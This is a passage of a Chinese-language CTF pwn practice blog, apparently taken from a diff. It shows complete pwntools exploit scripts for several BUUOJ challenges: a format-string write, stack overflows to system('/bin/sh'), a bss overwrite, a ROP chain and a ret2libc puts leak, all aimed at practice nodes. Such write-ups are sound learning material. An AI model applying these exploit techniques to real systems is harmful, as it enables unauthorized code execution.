+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">writes</span><span class="p">,</span> <span class="n">numbwritten</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;byte&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span><span class="p">:</span> <span class="n">格式化字符串在栈上的偏移量</span><span class="err">（</span><span class="n">就是之前算的那个</span> <span class="mi">10</span><span class="err">）。</span>
+</span></span><span class="line"><span class="cl"><span class="n">writes</span><span class="p">:</span> <span class="n">一个字典</span> <span class="p">{</span><span class="n">地址</span><span class="p">:</span> <span class="n">目标值</span><span class="p">}</span><span class="err">。</span><span class="n">你可以同时修改多个地址</span><span class="err">，</span><span class="n">比如</span> <span class="p">{</span><span class="n">addr1</span><span class="p">:</span> <span class="n">val1</span><span class="p">,</span> <span class="n">addr2</span><span class="p">:</span> <span class="n">val2</span><span class="p">}</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="n">numbwritten</span><span class="p">:</span> <span class="n">printf</span> <span class="n">在输出你的</span> <span class="n">Payload</span> <span class="n">之前已经输出的字符数</span><span class="err">（</span><span class="n">一般默认为</span> <span class="mi">0</span><span class="err">）。</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_size</span><span class="p">:</span> <span class="n">写入方式</span><span class="err">，</span><span class="n">可选</span> <span class="s1">&#39;byte&#39;</span> <span class="p">(</span><span class="o">%</span><span class="n">hhn</span><span class="p">),</span> <span class="s1">&#39;short&#39;</span> <span class="p">(</span><span class="o">%</span><span class="n">hn</span><span class="p">)</span> <span class="n">或</span> <span class="s1">&#39;int&#39;</span> <span class="p">(</span><span class="o">%</span><span class="n">n</span><span class="p">)</span><span class="err">。</span><span class="n">默认是</span> <span class="s1">&#39;byte&#39;</span><span class="err">，</span><span class="n">这也是最安全的</span><span class="err">。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">28464</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x0804C044</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_val</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># 这里随便写个数都行</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="p">{</span><span class="n">buf_addr</span><span class="p">:</span> <span class="n">target_val</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">target_val</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="jarvisoj_level2">jarvisoj_level2
+</h2><p>checksec</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260221154149069.png"
+	width="355"
+	height="116"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260221154149069_hu9657014488969400797.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260221154149069_hu10066437783057465349.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260221154149069"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="306"
+		data-flex-basis="734px"
+	
+></p>
+<p>32为NX保护，ida看一下</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260221154440421.png"
+	width="525"
+	height="157"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260221154440421_hu13907111097835098268.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260221154440421_hu5861630758184959342.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260221154440421"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="334"
+		data-flex-basis="802px"
+	
+></p>
+<p>read函数这里明显栈溢出，有system函数，看一下有没有binsh</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260221154747852.png"
+	width="619"
+	height="228"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260221154747852_hu9207652095537924125.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260221154747852_hu14055662380075376555.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260221154747852"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="651px"
+	
+></p>
+<p>那就很简单了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27716</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x0804A024</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x08048320</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ciscn_2019_n_8">ciscn_2019_n_8
+</h2><p>checksec</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222141113653.png"
+	width="517"
+	height="115"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222141113653_hu7663982474734692997.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222141113653_hu18311065738101566733.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222141113653"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="449"
+		data-flex-basis="1078px"
+	
+></p>
+<p>保护全开了，反编译看一下</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222141508030.png"
+	width="901"
+	height="619"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222141508030_hu7009310882427630330.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222141508030_hu2333420223431517939.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222141508030"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="145"
+		data-flex-basis="349px"
+	
+></p>
+<p>满足条件就getshell,查看一下n17这个变量</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222142121206.png"
+	width="1152"
+	height="373"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222142121206_hu1135993475195827492.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222142121206_hu7455638443084876024.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222142121206"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="308"
+		data-flex-basis="741px"
+	
+></p>
+<p>跟var都在bss段上，var是可控的，var数组的长度是0x94-0x60个长度，填充完var数组，剩下的就会溢出到n17,我们只需要构造溢出，将n17覆盖成17就行</p>
+<p>exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">27977</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x94</span><span class="o">-</span><span class="mh">0x60</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;What&#39;s your name?&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="bjdctf_2020_babystack">bjdctf_2020_babystack
+</h2><p>checksec</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222143705065.png"
+	width="414"
+	height="108"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222143705065_hu8215445650499761662.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222143705065_hu1621536856855602297.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222143705065"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="383"
+		data-flex-basis="920px"
+	
+></p>
+<p>64位NX保护</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222143916715.png"
+	width="694"
+	height="445"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222143916715_hu7718463363213412916.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222143916715_hu12892054413661372274.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222143916715"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="155"
+		data-flex-basis="374px"
+	
+></p>
+<p>存在栈溢出，查看buf的大小</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222144533046.png"
+	width="702"
+	height="247"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222144533046_hu7409165846067275122.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222144533046_hu12575954382605718711.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222144533046"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="284"
+		data-flex-basis="682px"
+	
+></p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222144658509.png"
+	width="886"
+	height="345"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222144658509_hu4420885876533177886.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222144658509_hu7551892831564749337.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222144658509"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="256"
+		data-flex-basis="616px"
+	
+></p>
+<p>查找system地址和binsh地址发现都有，直接getshell了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25196</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x400590</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x400858</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400833</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x400561</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># payload = b&#39;a&#39;*(0x18) + p64(0x4006EA)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;[+]Please input the length of your name:&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;[+]What&#39;s u name?&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然这里其实有后门函数来getshell</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222150331341.png"
+	width="1005"
+	height="248"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222150331341_hu7110528582777387708.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222150331341_hu12240874399009818572.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222150331341"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="405"
+		data-flex-basis="972px"
+	
+></p>
+<h2 id="ciscn_2019_c_1">ciscn_2019_c_1
+</h2><p>checksec</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222193709506.png"
+	width="403"
+	height="110"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222193709506_hu570433979109995799.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222193709506_hu3303860404814237080.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222193709506"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="366"
+		data-flex-basis="879px"
+	
+></p>
+<p>64位NX保护，运行程序像是一个加解密的程序，反编译看看代码</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222194635081.png"
+	width="944"
+	height="621"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222194635081_hu5014898521152250729.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222194635081_hu11108308245206377887.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222194635081"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="364px"
+	
+></p>
+<p>看一下encrypt函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222200534167.png"
+	width="729"
+	height="624"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222200534167_hu4406831587763559426.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222200534167_hu16623110825696533846.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222200534167"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="280px"
+	
+></p>
+<p>这里gets存在栈溢出，但是这里strlen检查到有输入的字符串长度的话，就会对输入的字符串进行加密，这里用<code>\0</code>截断strlen，因为strlen判断长度是通过<code>\0</code>的位置来判断的，这里查看函数没有system，也没有binsh，显然是要打ret2libc</p>
+<p>首先还是通过第一次溢出算libc基地址</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222201929990.png"
+	width="487"
+	height="447"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222201929990_hu2246170887343646805.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222201929990_hu4415332545818977183.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222201929990"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="108"
+		data-flex-basis="261px"
+	
+></p>
+<p>所以偏移是0x58,这里还是用puts的地址来计算libc基地址</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260222202527249.png"
+	width="772"
+	height="423"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260222202527249_hu15977616711406667159.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260222202527249_hu18038237519955041815.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260222202527249"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="438px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27504</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ciscn_2019_c_1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ciscn_2019_c_1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x58</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400c83</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x4006b9</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input your choice!&#34;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input your Plaintext to be encrypted&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Ciphertext&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;puts_addr: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样我们就拿到了puts的真实地址，但是libc版本不知道，没办法跟之前ctfwiki练习的例子一样直接减去symbols获取的地址来计算，这里就用到libcsearcher这个库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27504</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = process(&#39;./ciscn_2019_c_1&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ciscn_2019_c_1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x58</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400c83</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x4006b9</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input your choice!&#34;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input your Plaintext to be encrypted&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Ciphertext&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;puts_addr: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
